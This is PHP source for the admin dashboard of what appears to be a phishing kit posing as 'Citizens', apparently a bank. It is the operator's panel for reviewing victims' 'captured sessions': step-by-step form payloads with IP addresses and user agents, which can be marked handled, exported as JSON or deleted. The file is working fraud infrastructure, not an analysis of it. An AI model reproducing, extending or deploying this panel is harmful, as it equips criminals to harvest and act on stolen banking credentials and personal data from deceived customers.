<?php
require_once __DIR__ . '/../settings.php';
require_once __DIR__ . '/../H4Z3/functions.php';

if (!empty($adminSessionName)) {
    session_name($adminSessionName);
}
session_start();

if (isset($_POST['logout'])) {
    $_SESSION = [];
    if (ini_get('session.use_cookies')) {
        $params = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000, $params['path'], $params['domain'], $params['secure'], $params['httponly']);
    }
    session_destroy();
    header('Location: index.php');
    exit;
}

$loggedIn = !empty($_SESSION['admin_authenticated']);
$error = null;

if (!$loggedIn && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    if (hash_equals((string)$adminUser, (string)$username) && password_verify($password, $adminPassHash)) {
        $_SESSION['admin_authenticated'] = true;
        header('Location: index.php');
        exit;
    } else {
        $error = 'Invalid credentials provided.';
    }
}

if (!$loggedIn) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Citizens Admin Login</title>
        <meta name="robots" content="noindex, nofollow">
        <style>
            body { font-family: Arial, sans-serif; background: #f4f4f4; display:flex; align-items:center; justify-content:center; height:100vh; }
            .login-wrapper { background:#fff; padding:2rem; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,0.1); width:320px; }
            h1 { margin-top:0; font-size:1.5rem; }
            label { display:block; margin:0.5rem 0 0.25rem; font-weight:bold; }
            input[type="text"], input[type="password"] { width:100%; padding:0.5rem; border:1px solid #ccc; border-radius:4px; }
            button { margin-top:1rem; width:100%; padding:0.5rem; background:#0c4a6e; color:#fff; border:none; border-radius:4px; cursor:pointer; }
            button:hover { background:#0a3853; }
            .error { color:#b00020; margin-top:0.5rem; }
        </style>
    </head>
    <body>
        <div class="login-wrapper">
            <h1>Admin Access</h1>
            <?php if ($error): ?>
                <div class="error"><?php echo htmlspecialchars($error, ENT_QUOTES, 'UTF-8'); ?></div>
            <?php endif; ?>
            <form method="post" action="">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" autocomplete="off" required>
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
                <button type="submit">Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

if ($loggedIn && isset($_GET['export'])) {
    $exportId = $_GET['export'];
    $store = h4z3_load_session_store();
    if (isset($store['sessions'][$exportId])) {
        header('Content-Type: application/json');
        header('Content-Disposition: attachment; filename="session-' . preg_replace('/[^a-zA-Z0-9_-]/', '_', $exportId) . '.json"');
        echo json_encode($store['sessions'][$exportId], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
        exit;
    }
}

if ($loggedIn && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = $_POST['action'];
    $sessionId = $_POST['session_id'] ?? '';
    $store = h4z3_load_session_store();

    if (isset($store['sessions'][$sessionId])) {
        if ($action === 'mark_handled') {
            $store['sessions'][$sessionId]['handled'] = true;
        } elseif ($action === 'mark_unhandled') {
            $store['sessions'][$sessionId]['handled'] = false;
        } elseif ($action === 'delete') {
            unset($store['sessions'][$sessionId]);
        }
        h4z3_write_session_store($store);
    }

    header('Location: index.php');
    exit;
}

$store = h4z3_load_session_store();
$sessions = $store['sessions'];
uksort($sessions, function ($a, $b) use ($sessions) {
    $timeA = $sessions[$a]['last_updated'] ?? '';
    $timeB = $sessions[$b]['last_updated'] ?? '';
    return strcmp($timeB, $timeA);
});
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Citizens Admin Dashboard</title>
    <meta name="robots" content="noindex, nofollow">
    <style>
        body { font-family: Arial, sans-serif; background:#f1f5f9; margin:0; }
        header { background:#0c4a6e; color:#fff; padding:1rem 2rem; display:flex; justify-content:space-between; align-items:center; }
        main { padding:2rem; }
        .session-card { background:#fff; border-radius:8px; box-shadow:0 1px 3px rgba(0,0,0,0.1); margin-bottom:1.5rem; padding:1.5rem; }
        .session-meta { display:flex; justify-content:space-between; align-items:center; margin-bottom:1rem; flex-wrap:wrap; }
        .badge { padding:0.25rem 0.75rem; border-radius:999px; font-size:0.75rem; text-transform:uppercase; }
        .badge.handled { background:#d1fae5; color:#047857; }
        .badge.pending { background:#fee2e2; color:#b91c1c; }
        table { width:100%; border-collapse:collapse; margin-top:1rem; }
        th, td { text-align:left; padding:0.5rem; border-bottom:1px solid #e2e8f0; vertical-align:top; }
        th { background:#e2e8f0; }
        .actions { display:flex; gap:0.5rem; flex-wrap:wrap; }
        .actions form { margin:0; }
        button.action-btn, a.export-link { padding:0.35rem 0.75rem; border-radius:4px; border:none; cursor:pointer; font-size:0.85rem; text-decoration:none; display:inline-block; }
        button.action-btn { background:#0f172a; color:#fff; }
        button.action-btn.secondary { background:#1e293b; }
        button.action-btn.danger { background:#b91c1c; }
        a.export-link { background:#0369a1; color:#fff; }
        .empty-state { text-align:center; padding:4rem; color:#64748b; }
        .payload { font-family:monospace; font-size:0.85rem; background:#f8fafc; padding:0.5rem; border-radius:4px; }
    </style>
</head>
<body>
<header>
    <h1>Citizens Admin Dashboard</h1>
    <form method="post" action="" style="margin:0;">
        <input type="hidden" name="logout" value="1">
        <button type="submit" class="action-btn danger">Logout</button>
    </form>
</header>
<main>
    <?php if (empty($sessions)): ?>
        <div class="empty-state">No captured sessions available.</div>
    <?php else: ?>
        <?php foreach ($sessions as $sessionId => $sessionData): ?>
            <div class="session-card">
                <div class="session-meta">
                    <div>
                        <strong>Session:</strong> <?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?><br>
                        <small>Last updated: <?php echo htmlspecialchars($sessionData['last_updated'] ?? 'N/A', ENT_QUOTES, 'UTF-8'); ?></small>
                    </div>
                    <div class="badge <?php echo !empty($sessionData['handled']) ? 'handled' : 'pending'; ?>">
                        <?php echo !empty($sessionData['handled']) ? 'Handled' : 'Pending'; ?>
                    </div>
                </div>
                <div class="actions">
                    <form method="post" action="">
                        <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?>">
                        <input type="hidden" name="action" value="<?php echo !empty($sessionData['handled']) ? 'mark_unhandled' : 'mark_handled'; ?>">
                        <button type="submit" class="action-btn secondary"><?php echo !empty($sessionData['handled']) ? 'Mark Pending' : 'Mark Handled'; ?></button>
                    </form>
                    <a class="export-link" href="?export=<?php echo urlencode($sessionId); ?>">Export</a>
                    <form method="post" action="" onsubmit="return confirm('Delete this session?');">
                        <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?>">
                        <input type="hidden" name="action" value="delete">
                        <button type="submit" class="action-btn danger">Delete</button>
                    </form>
                </div>
                <?php if (!empty($sessionData['entries'])): ?>
                    <table>
                        <thead>
                            <tr>
                                <th style="width:20%;">Timestamp</th>
                                <th style="width:15%;">Step</th>
                                <th>Payload</th>
                                <th style="width:20%;">Meta</th>
                            </tr>
                        </thead>
                        <tbody>
                        <?php foreach ($sessionData['entries'] as $entry): ?>
                            <tr>
                                <td><?php echo htmlspecialchars($entry['timestamp'] ?? 'N/A', ENT_QUOTES, 'UTF-8'); ?></td>
                                <td><?php echo htmlspecialchars($entry['step'] ?? 'N/A', ENT_QUOTES, 'UTF-8'); ?></td>
                                <td class="payload">
                                    <?php foreach (($entry['payload'] ?? []) as $key => $value): ?>
                                        <div><strong><?php echo htmlspecialchars($key, ENT_QUOTES, 'UTF-8'); ?>:</strong> <?php echo htmlspecialchars((string)$value, ENT_QUOTES, 'UTF-8'); ?></div>
                                    <?php endforeach; ?>
                                </td>
                                <td class="payload">
                                    <div><strong>IP:</strong> <?php echo htmlspecialchars($entry['meta']['ip'] ?? 'N/A', ENT_QUOTES, 'UTF-8'); ?></div>
                                    <div><strong>User Agent:</strong> <?php echo htmlspecialchars($entry['meta']['user_agent'] ?? 'N/A', ENT_QUOTES, 'UTF-8'); ?></div>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                        </tbody>
                    </table>
                <?php endif; ?>
            </div>
        <?php endforeach; ?>
    <?php endif; ?>
</main>
</body>
</html>
